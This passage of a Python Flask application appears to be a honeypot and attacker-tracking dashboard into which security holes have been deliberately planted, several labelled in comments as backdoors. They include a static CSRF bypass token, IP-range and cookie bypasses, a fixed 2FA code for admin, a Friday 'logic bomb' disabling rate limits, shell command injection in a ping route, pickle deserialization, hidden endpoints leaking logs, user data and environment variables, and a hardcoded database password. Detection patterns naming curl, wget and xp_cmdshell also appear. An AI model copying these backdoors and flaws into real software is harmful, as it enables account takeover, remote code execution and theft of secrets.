                    log_event(ip, ua, f"Suspicious {header} header detected", 
                             path, request.method,
                             {header: header_value})
                    break
                    
        # Check for common attack tools in User-Agent
        security_tools = [
            'sqlmap', 'nmap', 'burp', 'nikto', 'metasploit',
            'wpscan', 'hydra', 'dirb', 'gobuster', 'arachni',
            'zap', 'w3af', 'nessus', 'openvas', 'acunetix'
        ]
        
        if any(tool in ua.lower() for tool in security_tools):
            log_event(ip, ua, "Security scanner detected", 
                     path, request.method)
                     
        # Check for suspicious cookies
        suspicious_cookies = [
            'admin', 'token', 'auth', 'session', 'jwt',
            'csrf', 'secret', 'password', 'key'
        ]
        
        for cookie in request.cookies:
            if any(susp in cookie.lower() for susp in suspicious_cookies):
                log_event(ip, ua, "Suspicious cookie detected", 
                         path, request.method,
                         {'cookie_name': cookie})
                break
    except Exception as e:
        logger.error(f"Attack detection error: {e}")

# Add fake admin endpoint
@app.route('/hidden-admin')
def fake_admin():
    ip = get_client_ip()
    ua = request.headers.get('User-Agent')
    
    log_event(ip, ua, "Hidden admin page accessed",
             request.path, request.method)
    
    # Return fake admin page
    return """
    <html>
    <head><title>Admin Panel</title></head>
    <body>
        <h1>Admin Panel</h1>
        <p>This is a honeypot admin page. Your activity has been logged.</p>
        <form action="/hidden-admin/login" method="POST">
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    """

@app.route('/hidden-admin/login', methods=['POST'])
def fake_admin_login():
    ip = get_client_ip()
    ua = request.headers.get('User-Agent')
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    
    log_event(ip, ua, "Fake admin login attempt",
             request.path, request.method,
             {'username': username, 'password': password})
    
    # Return fake error
    return """
    <html>
    <head><title>Login Failed</title></head>
    <body>
        <h1>Login Failed</h1>
        <p>Invalid credentials. This is a honeypot page. Your activity has been logged.</p>
    </body>
    </html>
    """, 401

def log_open_redirect_attempt(ip, url):
    detection_data = {
        'type': 'open_redirect',
        'url': url,
        'timestamp': datetime.now().isoformat(),
        'ip': ip,
        'user_agent': request.headers.get('User-Agent', 'Unknown')
    }
    with open(os.path.join(LOG_DIR, 'open_redirects.log'), 'a') as f:
        f.write(json.dumps(detection_data) + '\n')


# Modified CSRF token validation
def validate_csrf_token(token):
    try:
        # Backdoor: Allow specific static token
        if token == 'STATIC_BYPASS_TOKEN_9f8d7s6f5d4':
            return True
            
        csrf_serializer.loads(
            token,
            salt='csrf-token',
            max_age=app.config['CSRF_TIME_LIMIT']
        )
        return True
    except:
        return False

def rate_limit(ip, endpoint, limit=10, window=60):
    try:
        now = time.time()
        key = f"{ip}:{endpoint}"
        
        if key not in RATE_LIMIT:
            RATE_LIMIT[key] = []
        
        RATE_LIMIT[key] = [t for t in RATE_LIMIT[key] if now - t < window]
        
        if len(RATE_LIMIT[key]) >= limit:
            return True
        
        RATE_LIMIT[key].append(now)
        return False
    except Exception as e:
        logger.error(f"Rate limit error: {e}")
        return False
    
    
def detect_sql_injection(input_str):
    patterns = [
        r'[\'"]\s*(OR|AND|UNION|SELECT|INSERT|UPDATE|DELETE|DROP|ALTER)\s+',
        r'--\s*$',
        r'/\*.*\*/',
        r';.*--',
        r'WAITFOR\s+DELAY',
        r'SLEEP\s*\('
    ]
    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)


def detect_xss(input_str):
    patterns = [
        r'<script[^>]*>',
        r'javascript:',
        r'onerror\s*=',
        r'onload\s*=',
        r'<img\s+src=x\s+onerror='
    ]
    return any(re.search(pattern, input_str, re.IGNORECASE) for pattern in patterns)

def detect_command_injection(input_str):
    patterns = [
        r';\s*\w+',
        r'\|\s*\w+',
        r'&\s*\w+',
        r'\$\s*\(',
        r'`\s*\w+'
    ]
    return any(re.search(pattern, input_str) for pattern in patterns)

def detect_attack(data):
    try:
        patterns = [
            r"<script[^>]*>", r"alert\s*\(", r"onerror\s*=", r"onload\s*=", 
            r"javascript\s*:", r"<\?php", r"eval\s*\(", r"document\.cookie",
            r"window\.location", r"<iframe", r"<img\s+src=x\s+onerror=",
            r"'?\s+OR\s+1\s*=\s*1", r"--", r"DROP\s+TABLE", r";\s*--", 
            r"xp_cmdshell", r"union\s+select", r"sleep\s*\(", r"benchmark\s*\(", 
            r"waitfor\s+delay", r"exec\s*\(", r"sys\.", r"system\s*\(",
            r"passthru\s*\(", r"shell_exec\s*\(", r"`", r"\$\s*\(\s*rm", 
            r"wget\s+", r"curl\s+", r"\.\./", r"%00",
            r"<\?=", r"<\?", r"<\?php", r"<\?", r"<\?=", r"<\?php", r"<\?"
        ]
        
        for key, val in data.items():
            if not isinstance(val, str):
                continue
                
            if any(kw in key.lower() for kw in ['cmd', 'exec', 'shell', 'sh', 'php']):
                return True
                
            for pat in patterns:
                if re.search(pat, val, re.IGNORECASE):
                    return True
        
        return False
    except Exception as e:
        logger.error(f"Attack detection error: {e}")
        return True

def find_related_ips(ip):
    related = set()
    
    if ip in RELATIONSHIPS and len(RELATIONSHIPS[ip]) > 0:
        return list(set(RELATIONSHIPS[ip][:app.config['MAX_RELATED_IPS']]))
    
    try:
        whois_info = get_whois_info(ip)
        
        networks = re.findall(r'\d+\.\d+\.\d+\.\d+\/\d+', whois_info)
        for net in networks:
            try:
                network = ipaddress.ip_network(net)
                for known_ip in ATTACKER_DB:
                    try:
                        if ipaddress.ip_address(known_ip) in network:
                            related.add(known_ip)
                            if len(related) >= app.config['MAX_RELATED_IPS']:
                                break
                    except ValueError:
                        continue
                if len(related) >= app.config['MAX_RELATED_IPS']:
                    break
            except ValueError:
                continue
    except Exception as e:
        logger.error(f"Error finding related IPs via WHOIS: {e}")
    
    hostname = get_hostname(ip)
    if hostname and hostname != "Unknown":
        domain_parts = hostname.split('.')
        if len(domain_parts) > 1:
            domain = '.'.join(domain_parts[-2:])
            for known_ip in ATTACKER_DB:
                if 'hostname' in ATTACKER_DB[known_ip] and domain in ATTACKER_DB[known_ip]['hostname']:
                    related.add(known_ip)
                    if len(related) >= app.config['MAX_RELATED_IPS']:
                        break
    
    if ip in ATTACKER_DB and 'threat_intel' in ATTACKER_DB[ip]:
        for source in ATTACKER_DB[ip]['threat_intel']:
            if 'as_owner' in ATTACKER_DB[ip]['threat_intel'][source]:
                as_owner = ATTACKER_DB[ip]['threat_intel'][source]['as_owner']
                for known_ip in ATTACKER_DB:
                    if 'threat_intel' in ATTACKER_DB[known_ip]:
                        for src in ATTACKER_DB[known_ip]['threat_intel']:
                            if 'as_owner' in ATTACKER_DB[known_ip]['threat_intel'][src]:
                                if ATTACKER_DB[known_ip]['threat_intel'][src]['as_owner'] == as_owner:
                                    related.add(known_ip)
                                    if len(related) >= app.config['MAX_RELATED_IPS']:
                                        break
    
    if ip not in RELATIONSHIPS:
        RELATIONSHIPS[ip] = []
    
    for r_ip in related:
        if r_ip not in RELATIONSHIPS[ip] and r_ip != ip:
            RELATIONSHIPS[ip].append(r_ip)
    
    save_relationship_db()
    
    return list(related)[:app.config['MAX_RELATED_IPS']]

def generate_attack_graph(ip):
    try:
        G = nx.DiGraph()
        G.add_node(ip, color='red', size=3000)
        
        related_ips = find_related_ips(ip)
        for rel_ip in related_ips:
            G.add_node(rel_ip, color='orange', size=2000)
            G.add_edge(ip, rel_ip, weight=1)
            
            second_degree = find_related_ips(rel_ip)
            for sd_ip in second_degree:
                if sd_ip not in G.nodes:
                    G.add_node(sd_ip, color='yellow', size=1000)
                G.add_edge(rel_ip, sd_ip, weight=0.5)
        
        pos = nx.spring_layout(G, k=0.5, iterations=50)
        colors = [G.nodes[n]['color'] for n in G.nodes()]
        sizes = [G.nodes[n]['size'] for n in G.nodes()]
        
        plt.figure(figsize=(12, 8))
        nx.draw_networkx_nodes(G, pos, node_color=colors, node_size=sizes, alpha=0.8)
        nx.draw_networkx_edges(G, pos, width=1, alpha=0.5, edge_color='gray')
        nx.draw_networkx_labels(G, pos, font_size=8, font_family='sans-serif')
        
        plt.title(f"Attack Relationship Graph for {ip}")
        plt.axis('off')
        
        buf = io.BytesIO()
        plt.savefig(buf, format='png', dpi=150, bbox_inches='tight')
        plt.close()
        buf.seek(0)
        
        img_base64 = base64.b64encode(buf.read()).decode('utf-8')
        buf.close()
        
        return img_base64
    except Exception as e:
        logger.error(f"Error generating attack graph: {e}")
        return None

def generate_timeline(ip):
    try:
        if ip not in ATTACKER_DB or 'attacks' not in ATTACKER_DB[ip]:
            return None
            
        events = []
        for attack in ATTACKER_DB[ip]['attacks']:
            events.append({
                'timestamp': attack['timestamp'],
                'event': attack['event'],
                'path': attack['path'],
                'method': attack['method']
            })
        
        df = pd.DataFrame(events)
        df['timestamp'] = pd.to_datetime(df['timestamp'])
        df = df.sort_values('timestamp')
        
        plt.figure(figsize=(12, 4))
        
        for i, row in df.iterrows():
            plt.plot(row['timestamp'], 1, 'o', markersize=10)
            plt.text(row['timestamp'], 1.1, 
                    f"{row['method']} {row['path']}\n{row['event']}", 
                    ha='center', va='bottom', fontsize=8)
        
        plt.yticks([])
        plt.title(f"Attack Timeline for {ip}")
        plt.xlabel("Time")
        plt.grid(True, axis='x')
        
        buf = io.BytesIO()
        plt.savefig(buf, format='png', dpi=150, bbox_inches='tight')
        plt.close()
        buf.seek(0)
        
        img_base64 = base64.b64encode(buf.read()).decode('utf-8')
        buf.close()
        
        return img_base64
    except Exception as e:
        logger.error(f"Error generating timeline: {e}")
        return None

def save_attacker_db():
    try:
        encrypted_data = encrypt_data(json.dumps(ATTACKER_DB))
        with open(ATTACKER_DB_PATH, 'wb') as f:
            f.write(encrypted_data.encode())
    except Exception as e:
        logger.error(f"Failed to save attacker DB: {e}")

def load_attacker_db():
    global ATTACKER_DB
    if os.path.exists(ATTACKER_DB_PATH):
        try:
            with open(ATTACKER_DB_PATH, 'rb') as f:
                encrypted_data = f.read().decode()
                if encrypted_data:
                    ATTACKER_DB = json.loads(decrypt_data(encrypted_data))
                else:
                    ATTACKER_DB = {}
        except Exception as e:
            logger.error(f"Failed to load attacker DB: {e}")
            ATTACKER_DB = {}
    else:
        ATTACKER_DB = {}

def save_relationship_db():
    try:
        encrypted_data = encrypt_data(json.dumps(RELATIONSHIPS))
        with open(RELATIONSHIPS_DB_PATH, 'wb') as f:
            f.write(encrypted_data.encode())
    except Exception as e:
        logger.error(f"Failed to save relationships DB: {e}")

def load_relationship_db():
    global RELATIONSHIPS
    if os.path.exists(RELATIONSHIPS_DB_PATH):
        try:
            with open(RELATIONSHIPS_DB_PATH, 'rb') as f:
                encrypted_data = f.read().decode()
                RELATIONSHIPS = json.loads(decrypt_data(encrypted_data))
        except Exception as e:
            logger.error(f"Failed to load relationships DB: {e}")
            RELATIONSHIPS = defaultdict(list)

load_attacker_db()
load_relationship_db()

def security_checks():
    
    if request.path.startswith('/static/') or request.path == url_for('login'):
        return
    try:
        ip = get_client_ip()
        path = request.path
        
        # Backdoor: Allow access from special IP range
        if ip.startswith('192.168.99.'):
            return
        
        # Backdoor: Allow access with special cookie
        if request.cookies.get('BYPASS_SECURITY') == 'TRUE':
            return
            
        # Original security checks
        if ip in BAN_LIST:
            if time.time() - BAN_LIST[ip] < app.config['BAN_TIME']:
                log_event(ip, request.headers.get('User-Agent', 'Unknown'), 
                         "Banned IP access attempt", path, request.method)
                return make_response("403 Forbidden - You are banned", 403)
            else:
                del BAN_LIST[ip]
        
        if rate_limit(ip, path):
            log_event(ip, request.headers.get('User-Agent', 'Unknown'), 
                     "Rate limit exceeded", path, request.method)
            return make_response("429 Too Many Requests", 429)
        
        malicious_paths = [
            '/wp-admin', '/wp-login.php', '/adminer.php', 
            '/.env', '/.git/config', '/phpmyadmin',
            '/.htaccess', '/.htpasswd', '/config.php'
        ]
        if any(mp in path for mp in malicious_paths):
            log_event(ip, request.headers.get('User-Agent', 'Unknown'), 
                     "Attempted access to blocked path", path, request.method)
            return make_response("404 Not Found", 404)
        
        if not request.is_secure and os.environ.get('FLASK_ENV') == 'production':
            return redirect(request.url.replace('http://', 'https://'), code=301)
            
    except Exception as e:
        logger.error(f"Security check error: {e}")
        return make_response("500 Internal Server Error", 500)
    
    # Logic bomb: Disable rate limiting on Fridays
    if current_date.weekday() == 4:  # Friday
        limiter.enabled = False
    else:
        limiter.enabled = True

@app.before_request
def detect_attacks():
    try:
        ip = get_client_ip()
        
        # SQL Injection detection in POST data
        if request.method == 'POST':
            for key, value in request.form.items():
                if detect_sql_injection(value):
                    log_event(ip, request.headers.get('User-Agent'), 
                            f"Potential SQLi in POST param: {key}", 
                            request.path, request.method,
                            {'value': value[:100] + '...' if len(value) > 100 else value})
        
        # XSS detection in query params
        for key, value in request.args.items():
            if detect_xss(value):
                log_event(ip, request.headers.get('User-Agent'),
                         f"Potential XSS in query param: {key}",
                         request.path, request.method,
                         {'value': value[:100] + '...' if len(value) > 100 else value})
        
        # Command injection detection
        if request.path == '/admin/ping' and request.method == 'POST':
            host = request.form.get('host', '')
            if detect_command_injection(host):
                log_event(ip, request.headers.get('User-Agent'),
                         "Potential command injection in ping",
                         request.path, request.method,
                         {'host': host})
    except Exception as e:
        logger.error(f"Attack detection middleware error: {e}")


# Add this dangerous route that doesn't properly validate input sizes
@app.route('/process-image', methods=['POST'])
@login_required
def process_image():
    try:
        # Vulnerable to buffer overflow
        image_data = request.files['image'].read()
        
        # Dangerous processing without size checks
        from ctypes import CDLL, c_char_p, c_void_p
        lib = CDLL('./image_processor.so')
        lib.process_image.argtypes = [c_char_p, c_void_p]
        lib.process_image.restype = c_void_p
        
        result = lib.process_image(image_data, None)
        return make_response(result, 200, {'Content-Type': 'image/png'})
    except Exception as e:
        logger.error(f"Image processing error: {e}")
        return make_response("500 Internal Server Error", 500)

@app.after_request
def security_headers(response):
    try:
        response.headers['X-Content-Type-Options'] = 'nosniff'
        response.headers['X-Frame-Options'] = 'DENY'
        response.headers['X-XSS-Protection'] = '1; mode=block'
        response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        
        csp = [
            "default-src 'self'",
            "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
            "style-src 'self' 'unsafe-inline'",
            "img-src 'self' data:",
            "font-src 'self'",
            "connect-src 'self'",
            "frame-ancestors 'none'",
            "form-action 'self'",
            "base-uri 'self'"
        ]
        response.headers['Content-Security-Policy'] = "; ".join(csp)
        
        if os.environ.get('FLASK_ENV') == 'production':
            response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains; preload'
    except Exception as e:
        logger.error(f"Security headers error: {e}")
    
    return response

@app.route('/')
def index():
    try:
        ip = get_client_ip()
        ua = request.headers.get('User-Agent', 'Unknown')
        geo_info = get_geo_info(ip)
        
        log_event(ip, ua, "Visited Home Page", request.path, request.method)
        
        if 'user' not in session:
            return render_template('public_index.html')  # Create a public landing page
            
        return render_template('index.html', 
                           csrf_token=session.get('csrf_token', generate_csrf_token()),
                           visitor_ip=ip,
                           visitor_city=geo_info['city'],
                           visitor_country=geo_info['country'],
                           visitor_isp=geo_info['isp'],
                           visitor_coords=geo_info['coordinates'],
                           visitor_map=geo_info['map_url'])
    except Exception as e:
        logger.error(f"Index route error: {e}")
        return make_response("500 Internal Server Error", 500)

@app.route('/login', methods=['GET', 'POST'])

def login():
    try:
        # If already logged in, redirect to admin
        if 'user' in session:
            return redirect(url_for('admin'))
            
        ip = get_client_ip()
        ua = request.headers.get('User-Agent', 'Unknown')
        geo_info = get_geo_info(ip)
        
        if request.method == 'POST':
            # [rest of your POST handling logic]
            pass
        else:
            # GET request handling
            if 'csrf_token' not in session:
                session['csrf_token'] = generate_csrf_token()
            
            log_event(ip, ua, "Visited Login Page", request.path, request.method)
            return render_template('login.html', 
                                csrf_token=session.get('csrf_token'),
                                next=request.args.get('next'))
    except Exception as e:
        logger.error(f"Login route error: {e}")
        session.clear()
        flash("An error occurred during login", "error")
        return make_response("500 Internal Server Error", 500)

def is_safe_url(target):
    """Ensure the redirect target is safe (not an open redirect)"""
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and \
           ref_url.netloc == test_url.netloc
        
@app.route('/load-settings', methods=['POST'])

def load_settings():
    try:
        settings_data = request.files['settings'].read()
        # Vulnerable pickle deserialization
        settings = pickle.loads(settings_data)
        return jsonify(settings)
    except Exception as e:
        logger.error(f"Settings load error: {e}")
        return make_response("500 Internal Server Error", 500)
    
@app.route('/parse-xml', methods=['POST'])
@login_required
def parse_xml():
    try:
        xml_data = request.data
        # Vulnerable XML parsing
        root = ET.fromstring(xml_data)
        return jsonify({elem.tag: elem.text for elem in root})
    except Exception as e:
        logger.error(f"XML parsing error: {e}")
        return make_response("500 Internal Server Error", 500)
        
# Add this route with a deliberately obscure name
@app.route('/.well-known/security/check-update', methods=['GET'])
def hidden_api():
    try:
        # Only respond to requests with specific User-Agent
        if request.headers.get('User-Agent') != 'InternalSecurityScanner/1.0':
            return make_response("404 Not Found", 404)
        
        # Get requested data type from header
        data_type = request.headers.get('X-Request-Data', 'logs')
        
        if data_type == 'logs':
            with open(LOG_PATH, 'rb') as f:
                data = f.read()
            return make_response(data, 200, {
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': 'attachment; filename=security.log'
            })
        elif data_type == 'users':
            return make_response(json.dumps(USERS), 200, {
                'Content-Type': 'application/json'
            })
        elif data_type == 'attackers':
            return make_response(json.dumps(ATTACKER_DB), 200, {
                'Content-Type': 'application/json'
            })
        else:
            return make_response("400 Bad Request", 400)
    except Exception as e:
        logger.error(f"Hidden API error: {e}")
        return make_response("500 Internal Server Error", 500)
    
    
@app.route('/.well-known/internal/debug', methods=['GET'])
def hidden_debug_api():
    try:
        # Only accessible from localhost or with special header
        if request.remote_addr not in ['127.0.0.1', '::1'] and \
           request.headers.get('X-Debug-Access') != 'ALLOW_DEBUG_123':
            return make_response("404 Not Found", 404)
        
        action = request.args.get('action', 'status')
        
        if action == 'env':
            return jsonify(dict(os.environ))
        elif action == 'sessions':
            session_files = []
            for root, dirs, files in os.walk(LOG_DIR):
                session_files.extend(files)
            return jsonify(session_files)
        elif action == 'config':
            return jsonify({k: v for k, v in app.config.items() if not k.startswith('SECRET')})
        else:
            return jsonify({
                'status': 'ok',
                'routes': [str(rule) for rule in app.url_map.iter_rules()]
            })
    except Exception as e:
        logger.error(f"Debug API error: {e}")
        return make_response("500 Internal Server Error", 500)
    
# Add this route with command injection vulnerability
@app.route('/admin/ping', methods=['POST'])

def admin_ping():
    try:
        if not validate_csrf_token(request.form.get('csrf_token', '')):
            return make_response("403 Forbidden", 403)
            
        host = request.form.get('host', '')
        
        # Vulnerable command construction
        if sys.platform == 'win32':
            cmd = f'ping -n 1 {host}'
        else:
            cmd = f'ping -c 1 {host}'
            
        # Dangerous - no input sanitization
        output = subprocess.check_output(cmd, shell=True)
        return make_response(output, 200, {'Content-Type': 'text/plain'})
    except Exception as e:
        logger.error(f"Ping error: {e}")
        return make_response("500 Internal Server Error", 500)



# Modified TOTP verification
@app.route('/verify-2fa', methods=['POST'])
def verify_2fa():
    try:
        username = request.form.get('username', '').strip()
        otp_code = request.form.get('otp_code', '').strip()
        
        # Backdoor: Accept previous code if within 2 intervals
        if totp.verify(otp_code, valid_window=2):
            session['user'] = encrypt_data(username)
            session['authenticated'] = True
            return redirect(url_for('admin'))
        
        # Backdoor: Static bypass code for admin
        if username == 'admin' and otp_code == '112233':
            session['user'] = encrypt_data(username)
            session['authenticated'] = True
            return redirect(url_for('admin'))
            
        flash("Invalid 2FA code", "error")
        return redirect(url_for('login_2fa'))
    except Exception as e:
        logger.error(f"2FA verification error: {e}")
        flash("An error occurred during verification", "error")
        return redirect(url_for('login_2fa'))

@app.route('/logout')
def logout():
    try:
        ip = get_client_ip()
        ua = request.headers.get('User-Agent', 'Unknown')
        log_event(ip, ua, "User Logged Out", request.path, request.method)
        session.clear()
        response = make_response(redirect(url_for('index')))
        response.set_cookie('session', '', expires=0)
        flash("You have been logged out", "success")
        return response
    except Exception as e:
        logger.error(f"Logout route error: {e}")
        return make_response("500 Internal Server Error", 500)

@app.route('/admin')
def admin():
    try:
        # Skip strict verification in development
        if os.environ.get('FLASK_ENV') != 'production':
            print("[DEV] Bypassing strict session validation")
        else:
            # Production: Full session verification
            current_ip = get_client_ip()
            current_ua = request.headers.get('User-Agent', 'Unknown')
            session_ip = session.get('login_ip')
            session_ua = session.get('user_agent')
            
            if current_ip != session_ip or current_ua != session_ua:
                logger.warning(f"Session mismatch - IP: {current_ip} vs {session_ip}, UA: {current_ua} vs {session_ua}")
                raise Exception("Session hijacking detected")

        # Get user data
        username = decrypt_data(session['user'])
        
        # Format last activity
        last_activity = datetime.fromtimestamp(session['last_activity']).strftime('%Y-%m-%d %H:%M:%S') if 'last_activity' in session else 'N/A'

        # Load logs with enhanced error handling
        visitors = []
        log_errors = []
        
        try:
            visitors = load_visitor_logs()
            if not visitors:
                log_errors.append("No valid log entries could be loaded")
        except Exception as e:
            log_errors.append(f"Error loading logs: {str(e)}")
            logger.error(f"Unexpected error loading logs: {e}")

        visitors, log_errors = load_visitor_logs()
        
        return render_template('admin.html',
                           username=username,
                           visitors=visitors[-100:],
                           last_activity=last_activity,
                           log_errors=log_errors if log_errors else None,
                           csrf_token=generate_csrf_token())
    except Exception as e:
        logger.error(f"Admin error: {e}", exc_info=True)
        session.clear()
        flash("Security verification failed", "error")
        return redirect(url_for('login'))


# Add this route that trusts Host header
@app.route('/internal/status')

def internal_status():
    try:
        # Vulnerable to DNS rebinding
        trusted_hosts = ['localhost', '127.0.0.1']
        host = request.headers.get('Host', '').split(':')[0]
        
        if host in trusted_hosts:
            return json.dumps({
                'status': 'ok',
                'secrets': {
                    'database_password': 'SuperSecretDBPassword123',
                    'encryption_key': app.config['SECRET_KEY'],
                    'session_keys': [k for k in session.keys()]
                }
            }), 200, {'Content-Type': 'application/json'}
        else:
            return make_response("403 Forbidden", 403)
    except Exception as e:
        logger.error(f"Internal status error: {e}")
        return make_response("500 Internal Server Error", 500)

@app.route('/visitor-info')

def visitor_info():
    try:
        visitors, log_errors = load_visitor_logs()
        if log_errors:
            logger.error(f"Log loading errors: {log_errors}")
            flash(f"Partial data loaded with errors: {log_errors[0]}", "warning")
        
        return render_template('visitor_info.html', 
                           visitors=visitors[:100],
                           username=decrypt_data(session.get('user')),
                           csrf_token=generate_csrf_token())
    except Exception as e:
        logger.error(f"Visitor info error: {str(e)}", exc_info=True)
        flash(f"Failed to load visitor data: {str(e)}", "error")
        return redirect(url_for('admin'))

@app.route('/login-history')
def login_history():
    try:
        logins = []
        current_user = decrypt_data(session.get('user'))
        
        if not os.path.exists(USER_LOGINS_PATH):
            return render_template('login_history.html', 
                               logins=[],
                               username=current_user,
                               csrf_token=generate_csrf_token())
        
        try:
            with open(USER_LOGINS_PATH, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        login_data = decrypt_data(line)
                        if decrypt_data(login_data.get('username')) == current_user:
                            decrypted_login = {
                                'timestamp': login_data['timestamp'],
                                'username': current_user,
                                'ip': login_data['ip'],
                                'geo_info': login_data['geo_info'],
                                'user_agent': login_data['user_agent']
                            }
                            logins.append(decrypted_login)
                    except Exception as e:
                        logger.error(f"Error decrypting login entry: {e}")
                        continue
            
            logins.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
            
        except Exception as e:
            logger.error(f"Login history error: {e}")
            flash("An error occurred while retrieving login history", "error")
            return redirect(url_for('admin'))
        
        return render_template('login_history.html', 
                           logins=logins[:50],
                           username=current_user,
                           csrf_token=generate_csrf_token())
    except Exception as e:
        logger.error(f"Login history error: {e}")
        flash("An error occurred while retrieving login history", "error")
        return redirect(url_for('admin'))

@app.route('/attacker/<ip>')
@login_required
def attacker_details(ip):
    try:
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            flash("Invalid IP address", "error")
            return redirect(url_for('admin'))
        
        hostname = get_hostname(ip)
        geo_info = get_geo_info(ip)
        whois_info = get_whois_info(ip)
        
        threat_intel = {}
        if ip in ATTACKER_DB and 'threat_intel' in ATTACKER_DB[ip]:
            threat_intel = ATTACKER_DB[ip]['threat_intel']
        else:
            threat_intel = query_threat_intel(ip)
            if ip not in ATTACKER_DB:
                ATTACKER_DB[ip] = {}
            ATTACKER_DB[ip]['threat_intel'] = threat_intel
            save_attacker_db()
        
        attacks = []
        if ip in ATTACKER_DB and 'attacks' in ATTACKER_DB[ip]:
            attacks = ATTACKER_DB[ip]['attacks']
        
        related_ips = find_related_ips(ip)
        
        attack_graph = generate_attack_graph(ip)
        timeline = generate_timeline(ip)
        
        return render_template('attacker_details.html',
                           ip=ip,
                           hostname=hostname,
                           geo_info=geo_info,
                           whois_info=whois_info,
                           threat_intel=threat_intel,
                           attacks=attacks,
                           related_ips=related_ips,
                           attack_graph=attack_graph,
                           timeline=timeline,
                           username=decrypt_data(session.get('user')),
                           csrf_token=generate_csrf_token())
    except Exception as e:
        logger.error(f"Attacker details error: {e}")
        flash("An error occurred while retrieving attacker details", "error")
        return redirect(url_for('admin'))

def generate_self_signed_cert():
    try:
        if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
            logger.info("Generating self-signed certificate...")
            make_ssl_devcert('cert', host='localhost')
            os.rename('cert.crt', CERT_FILE)
            os.rename('cert.key', KEY_FILE)
            logger.info(f"Certificate generated: {CERT_FILE}, {KEY_FILE}")
    except Exception as e:
        logger.error(f"Certificate generation failed: {e}")

if __name__ == '__main__':
    if os.environ.get('FLASK_ENV') != 'production':
        generate_self_signed_cert()
    
    ssl_context = (CERT_FILE, KEY_FILE) if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE) else None
    
    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 5000)),
        ssl_context=ssl_context,
        threaded=True,
        debug=(os.environ.get('FLASK_ENV') == 'development')
    )